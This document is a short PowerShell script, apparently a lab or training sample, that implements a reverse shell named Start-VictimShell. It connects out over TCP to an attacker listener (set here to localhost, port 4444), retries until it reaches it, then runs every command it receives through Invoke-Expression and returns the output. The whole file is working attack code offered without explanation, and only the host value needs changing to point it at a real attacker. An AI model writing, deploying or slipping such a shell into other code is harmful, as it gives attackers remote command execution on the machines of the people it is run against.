Function Start-VictimShell(){
  $listen_port = 4444
  $listen_host = "localhost"
  $MAX_RECV_BYTES = 8192
  $MAX_ATTEMPTS = 10
  $keep_going = $true
  $prompt_string = "PS:Remote>"
  $prompt = [System.Text.Encoding]::ASCII.GetBytes($prompt_string)
  $bye = [System.Text.Encoding]::ASCII.GetBytes("Bye!`n`n")
  
  # Attempt to connect to attacker via TCP at address $listen_host, port $listen_port
  $attempt_ctr = 0
  while($attempt_ctr -le $MAX_ATTEMPTS -and $attempt_ctr -ne -1){
    $attempt_ctr++
    try{
      $client = New-Object System.Net.Sockets.TCPClient($listen_host, $listen_port)
      Write-Host " [*] Connected"
      $attempt_ctr = -1        
    }catch{
      " [-] There was an error starting the listener`n [-] $_`n [-] Attempt $attempt_ctr/$MAX_ATTEMPTS"
      if($attempt_ctr -ge $MAX_ATTEMPTS){
        return
      }else{
        Start-Sleep -Seconds 10
      }
    }
  }

  while ($keep_going) {
    $stream = $client.GetStream()
    $stream.Write($prompt, 0, $prompt.Length)
    $bytes = New-Object byte[] $MAX_RECV_BYTES
    $stream.Read($bytes, 0, $bytes.Length) | Out-Null
    $data = [System.Text.Encoding]::ASCII.GetString($bytes)
    $data = $data.trim(" `n`t`r`0")
    Write-Host " [*] Got $data"    
    if($data -eq "quit"){
      $keep_going = $false
      $stream.Write($bye, 0, $bye.Length)
      $stream.Flush()
      $stream.Dispose()
    }elseif($data -ne ""){
      $response_string = Invoke-Expression $data
      $response_string = $response_string | Out-String
      $response = [System.Text.Encoding]::ASCII.GetBytes($response_string)
      $stream.Write($response, 0, $response.Length)
      $stream.Flush()
    }  
  }
  $stream.Flush()
  $stream.Dispose()
  $client.Close()
  
  Write-Host " [*] Done"
}

Start-VictimShell
